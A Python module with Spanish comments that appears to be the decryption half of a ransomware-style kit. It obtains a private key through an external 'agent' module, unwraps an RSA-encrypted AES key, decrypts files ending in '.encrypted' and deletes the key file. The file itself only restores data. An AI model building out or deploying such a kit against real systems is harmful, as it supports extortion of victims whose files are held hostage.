import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad
from find_files import find_files
import agent

def load_private_rsa_key(): 
    path_rsa_private_key = os.path.abspath("rsa_private.pem")
    if os.path.exists(path_rsa_private_key):
        with open(path_rsa_private_key, "rb") as clave_file:
            return RSA.import_key(clave_file.read())
    else:
        raise FileNotFoundError(f"El archivo de clave privada no se encuentra en: {path_rsa_private_key}")

def load_aes_key_encrypted():
    path_aes_key = os.path.abspath("aes_key_encrypted.bin")
    if os.path.exists(path_aes_key):
        with open(path_aes_key, "rb") as clave_file:
            return clave_file.read()
    else:
        raise FileNotFoundError(f"El archivo de clave AES cifrada no se encuentra en: {path_aes_key}")

def decrypt_aes_key_encrypted (rsa_private_key, aes_key_encrypted):
    cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
    return cipher_rsa.decrypt(aes_key_encrypted)

def decrypt_file(file, aes_key_decrypted):
    with open(file, "rb") as f:
        iv_and_encrypted_data = f.read()
    iv = iv_and_encrypted_data[:16]  # El IV ocupa los primeros 16 bytes
    encrypted_data = iv_and_encrypted_data[16:]
    cipher = AES.new(aes_key_decrypted, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    with open(file, "wb") as f:
        f.write(decrypted_data)  # Sobrescribimos el archivo con los datos descifrados
    file_decrypted = file[:-10]  # Elimina la extensión '.encrypted'
    os.rename(file, file_decrypted) # Renombramos el archivo, eliminando la extensión '.encrypted'
    print(f"Archivo descifrado y renombrado: {file} -> {file_decrypted}")

def decrypt_files():
    agent.get_private_key()
    files = find_files() 
    if not files or not isinstance(files, list):  # Verificar la lista archivos
        print("Error: No se pudo obtener la lista de archivos o está vacía.")
        return
    rsa_private_key = load_private_rsa_key()
    aes_key_encrypted = load_aes_key_encrypted()
    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)
    print("Clave AES descifrada correctamente.")
    for file in files:
        if file.endswith(".encrypted") and os.path.isfile(file):  # Verifica extensión y que es un archivo válido
            decrypt_file(file, aes_key)
    os.remove("aes_key_encrypted.bin") # Eliminar la clave AES cifrada después del proceso
    print("Archivos descifrados correctamente.")

if __name__ == "__main__":
    decrypt_files()
